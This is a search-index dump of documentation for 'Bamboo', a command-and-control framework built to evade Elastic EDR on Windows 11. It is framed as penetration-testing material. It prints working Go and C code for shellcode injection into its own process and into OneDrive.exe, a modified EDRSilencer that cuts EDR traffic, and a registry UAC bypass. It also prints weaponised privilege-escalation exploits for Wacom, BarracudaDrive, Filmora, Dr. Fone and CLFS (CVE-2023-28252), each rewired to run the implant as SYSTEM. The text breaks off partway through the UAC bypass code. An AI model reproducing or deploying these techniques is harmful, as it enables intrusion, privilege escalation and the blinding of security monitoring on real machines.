var __index = {"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Introduction","text":"<p>Bamboo is a Command &amp; Control (C2) Framework that consists of three main components: Bamboo Client, Bamboo Teamserver, and Bamboo Agent. These components work together to allow users to have an easy yet scalable experience to do penetration testing or general testing of evading Elastic.  Bamboo offers multiple pre-built evasion techniques that are well tested and modified to evade Elastic. Moreover, there are multiple built-in third party exploits that users can use initially to try out Bamboo.</p> <p></p> <p>This website documents the various components of the Bamboo Framework, including its evasion tools, pre-built exploits and post-exploitation tools.</p>"},{"location":"bamboo_architecture.html","title":"Bamboo Architecture","text":"<p>This section will provide an overview of the Bamboo Framework components and how they interact. The Bamboo Framework consists of 3 major entities: The Client, the Teamserver and the Agent. The architecture diagram below illustrates how the components in each of these entities interact with one another.</p> <p></p>"},{"location":"bamboo_architecture.html#bamboo-client","title":"Bamboo Client","text":"<p>The Bamboo Client acts as the handler for the Bamboo Teamserver. Developed with Python 3.11, the user can use either the command line (CLI) or graphical interface (GUI) to interact with the rest of the framework and perform actions such as:</p> <ul> <li>Run exploits on a machine through the agent</li> <li>Add and modfify exploits avaliable on the Teamserver</li> <li>Use the team chat to message other Bamboo users on the same server</li> </ul> <p>The Bamboo Client can be run on most computers, but it is recommended to run it on the same host as the Teamserver, if only one Client is in use.</p>"},{"location":"bamboo_architecture.html#components","title":"Components","text":"Component Description Usage Commands Contain classes that directly calls Bamboo Teamserver endpoints Bamboo Client command will call the functions within the classes GUI Component Contain all GUI only related folders and files Bamboo Client GUI was built with and rely on this component to interect with Bamboo Teamserver Functions Contain miscellaneous functions that is called everywhere Bamboo Client relys on these function to be functional WebSocket Client Connects to server WebSocket Makes connection to Bamboo Teamserver WebSocket and process broadcasted messages Post Exploitation Methods Contain preloaded post exploit tools Bamboo Clients can use these tools to furture extract valuable information Post Exploits Results of post exploit tools are stored here Bamboo Clients can view the results of the post exploitation tool"},{"location":"bamboo_architecture.html#bamboo-teamserver","title":"Bamboo Teamserver","text":"<p>The Bamboo Teamserver, designed to run on a Kali Linux machine, is the central server that records and stores data and exploits, and acts as the communication bridge between the users and the Agents. It hosts both HTTPS RESTful APIs and manages Websocket connections to handle communications with other components in the framework.</p> <p>The Teamserver is built in Python 3.11, and uses Flask for HTTPS communication. MongoDB is used to store information such as user accounts, agents connected and their status, as well as exploits and their configurations.</p> <p>The Teamserver keeps track of Agents connected to it by storing their information in the database, and constantly receives heartbeat messages from them to ensure they are alive. The Teamserver then updates the status of the Agents, and mark agents that has not communicated the heartbeat back as 'dead', which gets cleaned from the database after a while.</p> <p>By default, the port used by the Teamserver is TCP 4444</p>"},{"location":"bamboo_architecture.html#components_1","title":"Components","text":"Component Description Usage APIs All endpoints that enable Bamboo to communicate Bamboo Client and Bamboo Agent pass information using the endpoints WebSocket API Enable Bamboo Client and Bamboo Agent to connect via WebSocket Allows WebSocket connection Database (MongoDB) Contains everything related to database (models, initialisation, and collections) Allow Bamboo Teamserver to initialise and interact with the database easily Functions Contain miscellaneous functions that is called everywhere Bamboo Teamserver relys on these function to be functional PEM Files Contains the certificate and key Allows Bamboo Teamserver to run in HTTPS and WSS with SSL"},{"location":"bamboo_architecture.html#bamboo-agent","title":"Bamboo Agent","text":"<p>The Agent an executable program developed using the Go programming language, and designed to run on a Windows 11 host. It resides in the target machine, and it is recommended for the Agent should be located in a user's desktop directory for the exploits made for the Bamboo Framework to work with the best effect.</p> <p>When the Agent is ran by either the command line or double clicking, it first collects information about the host and itself, such as preferred local and public IP addresses, hostname, and integrity level the agent is running at. The Bamboo agent then will repeatedly attempt to connect to the Bamboo Teamserver. Once it is connected, it will initialise a WebSocket connection with the Teamserver to allow it to receive instructions from the server.</p> <p>Once the agent is connected, it will perform two main actions:</p> <ol> <li>Listen to the Websocket connection for commmands send from the server</li> <li>Repeatedly send heartbeat messages to the Teamserver to indicate it is 'alive'</li> <li>To do this concurrently, the heartbeat function is ran in a goroutine for concurrency</li> </ol> <p></p>"},{"location":"bamboo_architecture.html#components_2","title":"Components","text":"Component Description Usage WebSocket Client Connects to Teamserver WebSocket Makes connection to Bamboo Teamserver WebSocket and process commands sent through it HTTPS HTTP RESTful communication Makes connection to Bamboo Teamserver APIs to send information or request for data Functions Miscellaneous functions Other commands the agent can perform Post Exploit Functions Contain post exploit functions Agent runs post-exploitation or enumeration function on command Exploit Methods Contain methods to execute exploits Agent receives and executes exploits on command"},{"location":"evasion.html","title":"Evasion","text":""},{"location":"evasion.html#shellcode-injection","title":"Shellcode Injection","text":"<p>Elastic Defend is unable to detect malicious in-memory files. Thus, these shellcode injection techniques are effective in executing payloads undetected. The shellcode injection techniques are implemented within Bamboo Agent.</p>"},{"location":"evasion.html#virtual-allocation-injection","title":"Virtual Allocation Injection","text":"<p>Virtual Allocation injection is a technique used to inject shellcode into memory. As this method of injection uses VirtualAlloc, it allocates and injects shellcode into the memory of its own process.</p> <p>The exploits used by Bamboo tend to crash the injected process, so using Virtual Allocation will likely cause the Agent that ran it to crash.</p> <p>The technique involves the following steps:</p> <ol> <li>Use VirtualAlloc to reserve space to inject the shellcode inside the process.</li> <li>Copy the shellcode into the reserved space using RtlCopyMemory.</li> <li>Call VirtualProtect to change the protection on the injected space to allow execution.</li> <li>Create a new thread in the process using CreateThread to run the shellcode in the injected space.</li> <li>WaitForSingleObject is used to wait for the thread to finish.</li> </ol> <p>Implementation</p> <p>zaneGittins\u2019 go-inject simplifies using Windows functions related to injections, and is used by the agent to implement this technique.</p> Expand code Go<pre><code>func VirturalAlloc(payload string) (err error) {\n  sc, err := hex.DecodeString(payload)\n  if err != nil {\n    fmt.Printf(\"\\nError decoding shellcode: %s\\n\", err)\n    return\n  }\n\n  address := inject.VirtualAlloc(uintptr(0), len(sc), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)\n  inject.RtlMoveMemory2(address, sc)\n  inject.VirtualProtect(address, len(sc), windows.PAGE_EXECUTE_READ)\n  thread := inject.CreateThread(address)\n  inject.WaitForSingleObject(thread, 0xFFFFFFFF)\n  return\n}\n</code></pre>"},{"location":"evasion.html#remote-process-injection","title":"Remote Process Injection","text":"<p>Remote Process Injection, also called Vanilla Process Injection, is a shellcode injection technique that injects the shellcode into the memory of another process. Unlike the Virtual Allocation Injection technique above, this technique used VirtualAllocEx rather than VirtualAlloc, which allocates memory in another process instead of the local process.</p> <p>The advantages of using process injection over injecting into itself are:</p> <ul> <li>Causing the injected process to crash instead of the agent used to inject.</li> <li>Make use of any whitelisting detection tools have for the injected process</li> </ul> <p>The steps this technique uses is:</p> <ol> <li>Get the PID of the process to inject.</li> <li>Call OpenProcess to get a handle for the process to inject into.</li> <li>Use VirtualAllocEx to allocate space for the shellcode in the remote process.</li> <li>Write the shellcode into the allocated space using WriteProcessMemory.</li> <li>Create a thread in the remote process with CreateRemoteThread to run the allocated space.</li> <li>Close the handle to the process with CloseHandle.</li> </ol> <p>Implementation</p> <p>Instead of finding the PID of a suitable process, the Agent will launch OneDrive.exe from the user\u2019s home directory. OneDrive is a very suitable process to inject into with the exploits Bamboo has, and launching the process before injecting into it will ensure that the process will be available to inject into. It is also whitelisted from Elastic Security\u2019s Component Model Hijacking as it is considered a noisy process.</p> Expand code Go<pre><code>...\nsc, err := hex.DecodeString(payload)\nif err != nil {\n  return\n}\n find and launch OneDrive.exe and use its PID\ncurrentUser, _ := user.Current()\noneDriveExe := currentUser.HomeDir + \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDrive.exe\"\ncmd := exec.Command(oneDriveExe)\ncmd.Stdout = os.Stdout\n// Start() runs the command without waiting for return - rest of the code can continue\n  err = cmd.Start()\n  if err != nil {\n  fmt.Println(err)\n    return errors.New(\"cannot launch process\")\n}\nexploitPID := cmd.Process.Pid\nfmt.Println(\"exploit pid:\", exploitPID)\n...\n</code></pre> <p>The rest of the injection technique is implemented with zaneGittins\u2019 go-inject library.</p> Expand code Go<pre><code>...\nprocessHandle, _ := inject.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uint32(int(exploitPID)))\nmemptr := inject.VirtualAllocEx(processHandle, uintptr(0), len(sc), 0x3000, 0x40)\n\n_ = inject.WriteProcessMemory(processHandle, memptr, sc)\ninject.CreateRemoteThread(processHandle, 0, 0, memptr, 0, 0, 0)\ninject.CloseHandle(processHandle)\nfmt.Println(windows.GetLastError())\nreturn\n</code></pre>"},{"location":"evasion.html#ntqueueapcthreadex-ntdll-gadget-injection","title":"NtQueueApcThreadEx NTDLL Gadget Injection","text":"<p>Description</p> <p>This is a novel shellcode injection method first used by Roshtyak, the DLL backdoor used by the malware Raspberry Robin. This was adapted into a C program and published on github by LLoydLabs, which is the original code Bamboo uses for its NtQueueApcThreadEx NTDLL Gadget Injection. The image below shows the parameters of <code>NtQueueApcThreadEx()</code>, a function in the Windows Native API. The original code only works with x86 shellcode. However, in the explanation below, the gadget <code>pop rax; ret</code> is used instead of <code>pop r32; ret</code> to make the technique work with x64 shellcode instead.</p> <p></p> <p>The technique uses the following steps:</p> <ol> <li>Allocate shellcode into the memory of the current process</li> <li>Scan the ntdll.dll code sections of the current process for a <code>pop rax; ret</code> gadget and pick 1 of these gadgets randomly. <ul> <li>\u201crax\u201d refers to a general-purpose register such as eax, ebc, ecx etc. Thus, an example gadget that would meet this requirement is <code>pop ebp; ret</code>. </li> <li>An exception is the gadget <code>pop esp; ret</code> because this would pivot the stack. </li> <li>\u201cCode sections\u201d refers to IMAGE_SCN_CNT_CODE and IMAGE_SCN_MEM_EXECUTE</li> </ul> </li> <li>Call <code>NtQueueApcThreadEx()</code> with the <code>ApcRoutine</code> set to the address of the random gadget found in step 2 (<code>pop rax; ret</code>) and <code>SystemArgument1</code> as the pointer to the shellcode allocated in step 1. <ul> <li>With <code>ApcRoutine</code> set to the random gadget, the <code>pop r32</code> instruction will make the stack pointer point to <code>SystemArgument1</code>. </li> <li>The <code>ret</code> instruction will make the Instruction Pointer (IP) jump to the location that <code>SystemArgument1</code> points to, which is the location of the allocated shellcode in step 1  </li> </ul> </li> </ol> <p>This technique requires Microsoft Visual C++ redistributables x86 to be installed on the target which can be found at https://aka.ms/vs/16/release/vc_redist.x86.exe.</p> <p>Implementation</p> <p>The code is modified to work with x64 shellcode by changing a single line in gadget.h as shown in the code snippet below.</p> Expand code C<pre><code>static\nBOOL\ngadget_match_valid(\n    PBYTE pbAddress\n)\n{\n    //return (*pbAddress != 0x5C &amp;&amp; (*pbAddress &amp; 0xF0) == 0x50) &amp;&amp; *(pbAddress + 1) == 0xC3; // for x86\n    return *pbAddress == 0x58 &amp;&amp; *(pbAddress + 1) == 0xC3; // for x64\n\n}\n</code></pre> <p>Additionally, in the original code, the shellcode was hardcoded in main.h. In Bamboo, the code is modified to receive shellcode via standard input. After the injection program is dropped onto the target and executed, the shellcode will be passed via standard input from the agent as a hexstring in the format \u201cab1823129ef\u2026\u201d, which is the standard format of shellcode that our agent uses for its injection techniques. This hexstring is stored into a buffer of the injection program and converted by a <code>convert_hex()</code> function into a hexstring of format \u201c\\xab\\x18\\x23\\x12\\xef\u2026\u201d. The rest of the code follows the logic of the original PoC from LloydLabs.</p>"},{"location":"evasion.html#edr-blinding","title":"EDR Blinding","text":"<p>The tool below is not an injection technique, but instead used to disrupt the effectiveness of the EDR itself.</p>"},{"location":"evasion.html#edr-silencer","title":"EDR Silencer","text":"<p>Description</p> <p>EDRSilencer, created by netero1010 is an open-source evasion tool designed for disrupting Endpoint Detection and Response (EDR) systems. It leverages Windows Filtering Platform (WFP) APIs, which allows a program developer to create network filtering software that can examine, modify and stop network traffic. EDRSilencer uses the WFP to prevent EDR agents and processes from connecting and reporting security events with their servers, effectively disabling the EDR\u2019s threat detection capabilities of the EDR. The tool currently supports Elastic EDR, among other popular EDR solutions.</p> <p>Implementation</p> <p>In the original code's main function, it checks if the user inputs the correct number of command-line arguments and performs different actions based on the argument\u2019s value:</p> Arguments Description -h or --help Prints the help information blockedr Blocks all detected EDR processes from sending outbound traffic block  Blocks a specific process from sending outbound traffic unblockall Removes all WFP filters applied unblock  Removes a specific WFP filter based on its filter ID <p>The team modified the main function of the original code. The modified code no longer requires command-line arguments. It has been altered to only execute the  <code>blockedr</code> argument. The modified code is as follows:</p> Expand code C<pre><code>int main() {\n    if (!CheckProcessIntegrityLevel()) {\n        return 1;\n    }\n    PrintHelp();\n    BlockEdrProcessTraffic();\n    return 0;\n}\n</code></pre> <p>This modification allows the executable to be easily incorporated within our C2 and agent, making it more convenient and efficient for our purposes.</p>"},{"location":"exploits.html","title":"Exploits","text":""},{"location":"exploits.html#overview","title":"Overview","text":"<p>Bamboo comes with pre-loaded exploits for users to test the evasion techniques with. Bamboo also allows users the ability to add their own exploits. These exploits are stored as files in Bamboo Teamserver.</p> Application / Service Vulnerable Version(s) CVE Identifier Wacom Driver 6.3.45-1 CVE-2023-32162 BarracudaDrive 6.5 CVE-2020-23834 Wondershare Filmora 12.2.9.2233 and below CVE-2023-31747 Wondershare Dr. Fone 12.3.14 CVE-2021-44596 Windows Common Log File System Windows 11 21H2, Windows 11 22H2 CVE-2023-28252 UAC Bypass - -"},{"location":"exploits.html#wacom-driver","title":"Wacom Driver","text":"<p>Description</p> <p>Wacom specialises in pen displays and tablets for designers. These products require the Wacom Driver to be installed. Luca Barile discovered several vulnerabilities, including one which allowed for Local Privilege Escalation (LPE). The exploit abuses various flaws in the design of the Wacom\u2019s utilities, including especially the implementation of Remove.exe for the backup process. Full details can be found on Luca\u2019s blog.</p> <p>Implementation</p> <p>Majority of the original code from Luca\u2019s LPE exploit was kept. However, the original exploit would launch a command prompt. In Bamboo, the exploit is modified to execute the agent.exe file which will be located on the user\u2019s desktop. This is achieved by instead injecting a Wacom command to launch the agent.exe file as shown in the code below.</p> Expand code C#<pre><code>string input1_line1 = \"/debug \\\\\"\" + pathInstallerDAT + \"\\\\\" /silent\";\nstring input1_line2 = \"[PrivilegeEscalation]\";\n\nstring username = Environment.UserName;\nstring input1_line3 = @\"Execute;1000;!WINDOWS!\\\\\\\\..\\\\\\\\Users\\\\\\\\\" + username + @\"\\\\\\\\Desktop\\\\\\\\agent.exe\";\nstring input1_line4 = \"DONE\";\nstring input2_line1 = \"/command PrivilegeEscalation /silent /debug \\\\\"\";\n</code></pre>"},{"location":"exploits.html#barracudadrive","title":"BarracudaDrive","text":"<p>Description</p> <p>BarracudaDrive is a web-based file explorer that provides users with a convenient way to access and manage files on local machines or network-attached storage devices. This application features file sharing, file management, advanced server side scripting language and collaboration capabilities. The application\u2019s vulnerability exploits weak and insecure folder permissions.</p> <p>Implementation</p> <p>The team constructed the exploit code to stop the application\u2019s service, copy the content of Bamboo\u2019s agent executable into C:\\bd\\bd.exe and start the service again after 30 seconds.</p> Expand code Go<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"io\"\n    \"time\"\n)\nfunc writeWondershare() {\n    // Get current user name from environment var\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n\n    //  opy the agent.exe file to C:\\Users\\[username]]\\Desktop\\bd.exe\n    agentFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\agent.exe\"\n    wondershareFilepath := \"C:\\\\bd\\\\bd.exe\"\n\n    agentFile, err := os.Open(agentFilepath)\n    if err != nil {\n        fmt.Printf(\"Error opening agent.exe: %v\", err)\n        return\n    }\n    defer agentFile.Close()\n\n    wondershareFile, err := os.Create(wondershareFilepath)\n    if err != nil {\n        fmt.Printf(\"Error creating bd.exe: %v\", err)\n        return\n    }\n    defer wondershareFile.Close()\n\n    _, err = io.Copy(wondershareFile, agentFile)\n    if err != nil {\n        fmt.Printf(\"Error copying agent.exe into bd.exe: %v\", err)\n        return\n    }\n}\n\n// restart bd service\nfunc restartbd() error {\n    serviceName := \"bd\"\n    fmt.Println(\"Stopping bd service...\")\n    cmd1 := exec.Command(\"sc\", \"stop\", serviceName)\n    err := cmd1.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    // wait for service to stop till we call writeWondershare()\n    fmt.Println(\"Waiting for 30 seconds...\")\n    time.Sleep(30 * time.Second)\n    writeWondershare()\n\n    fmt.Println(\"Starting bd service...\")\n    cmd2 := exec.Command(\"sc\", \"start\", serviceName)\n    err = cmd2.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    return nil\n}\n\nfunc main() {\n    restartbd()\n    fmt.Printf(\"Exploit complete\")\n}\n</code></pre> <p>In order to execute the Service Control (sc) utility to restart the service, administrative privileges are required. To overcome this, a manifest file was needs to be embedded into the executable.</p> Expand code XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n        &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n                &lt;security&gt;\n                        &lt;requestedPrivileges&gt;\n                                &lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/&gt;\n                        &lt;/requestedPrivileges&gt;\n                &lt;/security&gt;\n        &lt;/trustInfo&gt;\n&lt;/assembly&gt;\n</code></pre> <p>In the manifest file, the <code>requestedExecutionLevel</code> was specified as <code>requireAdministrator</code>. This configuration informs Windows OS that the application necessitates elevated privileges to function correctly. This manifest file is then converted into a .syso file using the rsrc tool by akavel.</p> PowerShell<pre><code>.\\rsrc -manifest bd.exe.manifest -o bd.syso\n</code></pre> <p>Lastly, build the exploit with <code>go build</code> . The Go compiler will detect the .syso file and embed it in the final executable.</p>"},{"location":"exploits.html#wondershare-filmora","title":"Wondershare Filmora","text":"<p>Description</p> <p>Filmora is a video editor by Wondershare. The specific vulnerable component is NativePush (Build 1.0.0.7), which contains an unquoted service path. The unquoted service path allows attackers to execute their own file in place of the actual service file, allowing it to be executed with SYSTEM privileges when the service is run. Running the service requires administrator privileges. The vulnerability was authored by Thurein Soe.</p> <p>Implementation</p> <p>The exploit for Filmora was written by the team in Golang. It creates the agent.exe file in the unquoted service path, then restarts the NativePushService, causing the agent.exe file to be executed with SYSTEM integrity context.</p> Expand code Go<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"io\"\n)\n\n// Restart NativePushService\nfunc restartNativePushService() error {\n    serviceName := \"NativePushService\"\n    cmd1 := exec.Command(\"sc\", \"stop\", serviceName)\n    err := cmd1.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    cmd2 := exec.Command(\"sc\", \"start\", serviceName)\n    err = cmd2.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    return nil\n}\n\nfunc writeWondershare() {\n    // Get current user name from environment var\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n\n    // Copy the agent.exe file to C:\\Users\\[username]]\\Desktop\\Wondershare.exe\n    agentFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\agent.exe\"\n    wondershareFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\AppData\\\\Local\\\\Wondershare\\\\Wondershare.exe\"\n\n    agentFile, err := os.Open(agentFilepath)\n    if err != nil {\n        fmt.Printf(\"Error opening agent.exe: %v\", err)\n        return\n    }\n    defer agentFile.Close()\n\n    wondershareFile, err := os.Create(wondershareFilepath)\n    if err != nil {\n        fmt.Printf(\"Error creating wondershare.exe: %v\", err)\n        return\n    }\n    defer wondershareFile.Close()\n\n    _, err = io.Copy(wondershareFile, agentFile)\n    if err != nil {\n        fmt.Printf(\"Error copying agent.exe into wondershare.exe: %v\", err)\n        return\n    }\n}\n\nfunc main() {\n    // Write the Wondershare.exe file\n    writeWondershare()\n\n    // Restart NativePushService\n    err := restartNativePushService()\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    fmt.Printf(\"Exploit complete\")\n}\n</code></pre> <p>Similarly to the BarracudaDrive exploit above, administrator privileges are needed to use the Service Control Utility (sc.exe) to restart the service. This means the exploit file must be run with administrative privileges. To achieve this, a manifest file (filmora.exe.manifest) must be embedded which specifies the <code>requestExecutionLevel</code> as <code>requireAdministrator</code> .</p> Expand code Go<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n        &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n                &lt;security&gt;\n                        &lt;requestedPrivileges&gt;\n                                &lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/&gt;\n                        &lt;/requestedPrivileges&gt;\n                &lt;/security&gt;\n        &lt;/trustInfo&gt;\n&lt;/assembly&gt;\n</code></pre> <p>Afterwards, the manifest file is generated into a .syso file using rsrc by akavel</p> PowerShell<pre><code>.\\rsrc -manifest filmora.exe.manifest -o filmora.syso\n</code></pre> <p>Finally, the exploit is built with <code>go build</code> . Go detects the .syso file upon compilation and embed the file into the final executable.</p>"},{"location":"exploits.html#wondershare-dr-fone","title":"Wondershare Dr. Fone","text":"<p>Description</p> <p>The vulnerability and a PoC was discovered by Peled and Cohen. Dr. Fone install additional features as modules, which uses the service InstallAssistService to actually install it. The service listens on a random UDP port defined in the file C:\\ProgramData\\Wondershare\\ModuleUpgrade\\port. The service accepts any requests to it in the right format as commands without any form of authorization or validation and executes them at up to SYSTEM privilege.</p> <p>Implementation</p> <p>For an exploit that runs locally, this is the process that is used:</p> <ol> <li>Locate where the agent is located (in the user desktop directory) and craft the payload to run the agent at system level.</li> <li>Read C:\\ProgramData\\Wondershare\\ModuleUpgrade\\port to identify the port number the service is running on.</li> <li>Send the payload to the service through the UDP port.</li> </ol> Expand code Go<pre><code>func main() {\n    // agent location\n    currentUser, _ := user.Current()\n    homedir := currentUser.HomeDir\n\n    // making payload\n    // payload format - filepath, parameters, authority, callpid\n    payload := fmt.Sprintf(\"%s\\\\Desktop\\\\agent.exe\\n\\nAdmin\\n12345\", homedir)\n    fmt.Println(payload)\n    // get port\n    // C:\\ProgramData\\Wondershare\\ModuleUpgrade\\port\n    data, _ := os.ReadFile(\"C:\\\\ProgramData\\\\Wondershare\\\\ModuleUpgrade\\\\port\")\n    port := string(data)\n    fmt.Println(\"\\n port found:\", port)\n\n    conn, err := net.Dial(\"udp\", \"127.0.0.1:\"+port)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    // send payload to port\n    _, err = conn.Write([]byte(payload))\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    conn.Close()\n}\n</code></pre>"},{"location":"exploits.html#windows-common-log-file-system","title":"Windows Common Log File System","text":"<p>Description</p> <p>The Windows Common Log File System (CLFS) is a high performing, general-purpose logging system that helps applications keep track of important events and recover from failures. It was discovered that a vulnerability exists due to an out of bound read and write flaw, leading to the execution of arbitrary code. The specific Windows 11 builds affected by this vulnerability are:</p> <p>The specific Windows 11 builds affected by this vulnerability are:</p> <ul> <li>Windows 11 22H1 (fixed in version 10.0.22000.1817)</li> <li>Windows 11 22H2 (fixed in version 10.0.22621.1555)</li> </ul> <p>Implementation</p> <p>The original PoC was developed by Fortra, a company that provides cybersecurity and automation solutions (www.fortra.com, n.d.). The execution of the original PoC requires three parameters: token offset, flag and the program to be executed. For instance, if the team wishes to elevate calc.exe to SYSTEM privileges, the command will be clfs_eop.exe 1208 1 calc.exe. Our team has modified the original PoC to automatically launch the agent executable with SYSTEM privileges. All credit goes to the original author, Fotra for discovering this vulnerability and creating the original PoC exploit.</p> <p>The code snippet shown below pertains to the manage_args function within clfs_eop.cpp. The team hardcoded the values of the token offset and flag to 1208 and 1 respectively. This eliminates the need for user input to these parameters. Setting these parameters directly in the code simplifies the execution process and ensures that the program being launched always has SYSTEM privileges.</p> Expand code C++<pre><code>void manage_args(int argc, TCHAR* argv[]) {\n\n            // hardcoded values\n    argv[1] = (TCHAR*)\"1208\";\n    argv[2] = (TCHAR*)\"1\";\n\n    token_offset = atoi((CHAR*)argv[1]);\n    if (token_offset == 0) {\n        printf(\"[+] Invalid token offset argument, must be decimal number\\n\");\n        exit(1);\n    }\n\n    flag = atoi((CHAR*)argv[2]);\n    if (flag == 0) {\n        printf(\"[+] Invalid token offset argument, must be decimal number\\n\");\n        exit(1);\n    }\n\n    printf(\"\\n\\nARGUMENTS\\n\");\n    printf(\"[+] TOKEN OFFSET %x\\n\", token_offset);\n    printf(\"[+] FLAG %x\\n\\n\", flag);\n    return;\n\n}\n</code></pre> <p>The code snippet shown below declares a global variable within clfs_eop.cpp. The function, getCurrentUsername retrieves the current username of the user and stores it in the global variable, currentUsername. It returns true on success and false on failure. This will be used in the to_trigger function which will be exhibited in the next code snippet.</p> Expand code C++<pre><code>// global variable currentUsername\nTCHAR currentUsername[500];\n// function to retrieve current user's username bool getCurrentUsername() {\n    DWORD size = sizeof(currentUsername) / sizeof(currentUsername[0]);\n\n    if (GetUserName(currentUsername, &amp;size)) {\n            // ensures null-termination\n            currentUsername[size] = '\\0';\n            std::wcout &lt;&lt; L\"CURRENT USER=\" &lt;&lt; currentUsername &lt;&lt; std::endl;\n            return true;\n\n    } else {\n            std::cerr &lt;&lt; \"Error: \" &lt;&lt; GetLastError() &lt;&lt; std::endl;\n            return false;\n        }\n}\n</code></pre> <p>The code snippet shown below pertains to the to_trigger function within clfs_eop.cpp. In the original code, the program it executes is notepad.exe by default. Instead of launching notepad.exe, the team modified it to launch the agent executable located in the user\u2019s directory and the team used the global variable declared in the previous code snippet and parsed it in the %s to complete the full file path.</p> Expand code C++<pre><code>    TCHAR agentPath[1000];\n\n// launch agent.exe within the current user's directory \\_stprintf_s(agentPath,\\_T(\"C:\\\\Users\\\\%s\\\\Desktop\\\\agent.exe\"), currentUsername);\n\n// check if we became SYSTEM\nif (\\_tcscmp(username, \\_T(\"SYSTEM\")) == 0) {\nprintf(\"WE ARE SYSTEM\\n\");\nTCHAR fpath[1000];\n\\_stprintf_s(fpath, \\_T(\"%s\"), agentPath);\n\\_tprintf(\\_T(\"Executing: %s\\n\"), fpath);\n\\_tsystem(fpath);\n} else {\nprintf(\"NOT SYSTEM\\n\");\n}\n</code></pre> <p>The getCurrentUsername function has also been called in the first line of the main function.</p> Expand code C++<pre><code>int main(int argc, TCHAR* argv[]) {\n    getCurrentUsername();\n    manage_args(argc, argv);\n    getVirtualAddress();\n    InitEnvironment();\n    doFirstAlloc();\n    createInitialLogFile();\n    fun_prepare();\n    to_trigger();\n    exit(1);\n    return 0;\n}\n</code></pre> <p>With this modification, it elevates our team\u2019s agent executable to SYSTEM privileges when it is being launched. The CLFS exploit, both original and modified, triggers two Malware Detection Alert in Elastic. The description of the two alerts are:</p> <ul> <li>File event with process explorer.exe, parent process userinit.exe, file clfs_eop.exe</li> <li>Process event with exploit.exe, parent process cmd.exe, file clfs_eop.exe</li> </ul> <p>This indicates that Elastic statically detects the exploit when it is first dropped onto the local machine\u2019s disk and again when executed.</p>"},{"location":"exploits.html#uac-bypass","title":"UAC Bypass","text":"<p>This is not an exploit, but is used in conjunction with certain exploits such as Filmora and BarracudaDrive.</p> <p>Description</p> <p>UAC is a security feature in Windows which requires applications to prompt for consent before an administrative task can be performed. This prevents malicious applications from running on your Windows device. The first image shows an example of a normal user receiving a UAC prompt, while the second image shows an example of an administrative user receiving a UAC prompt. A normal user requires an administrators login credentials while an administrative user just has a \u201cYes\u201d and \u201cNo\u201d consent box.</p> <p></p> <p>For more information on UAC, see this article from Microsoft.</p> <p>A UAC Bypass ONLY works if the current user is in the administrators group. It allows an application to bypass the consent prompt and run with administrator privileges. There are various methods to achieve a UAC Bypass as shown by HackTricks. In Bamboo, the UAC Bypass is achieved by modifying registry keys for the Windows computerdefaults.exe utility.</p> <p>Implementation</p> <p>The UAC Bypass script was written by the team in Golang. The code creates 2 registry keys and launches the computerdefaults.exe process. This works because when computerdefaults.exe is launched, it looks for the registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command which by default does not exist. If the key exists, it looks for the value HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute. If this value is found, computerdefaults.exe will look for the default value in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command. computerdefaults.exe follows the command found at the value in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\ when it starts. Thus, the team has directed it to launch our exploit which will always be dropped as \u201cpayload.exe\u201d in the user\u2019s Desktop.</p> Expand code Go<pre><code>package main\n\nimport (\n\"fmt\"\n\"golang.org/x/sys/windows/registry\"\n\"os/exec\"\n\"os\"\n\"path/filepath\"\n)\n\nfunc main() {\n\n    // Get current user name from environment var and determine location of payload to execute as admin\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n    payloadLocation := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\payload.exe\"\n    fmt.Printf(\"Payload location set as %v\\n\", payloadLocation)\n\n    // Modify registry keys\n    keyPath := `Software\\Classes\\ms-settings\\Shell\\Open\\command`\n    if err := setRegistryValue(registry.CURRENT_USER, keyPath, \"DelegateExecute\", \"\"); err != nil {\n        fmt.Printf(\"Error setting registry value: %v\\n\", err)\n        return\n    }\n    fmt.Printf(\"Successfully set registry value: 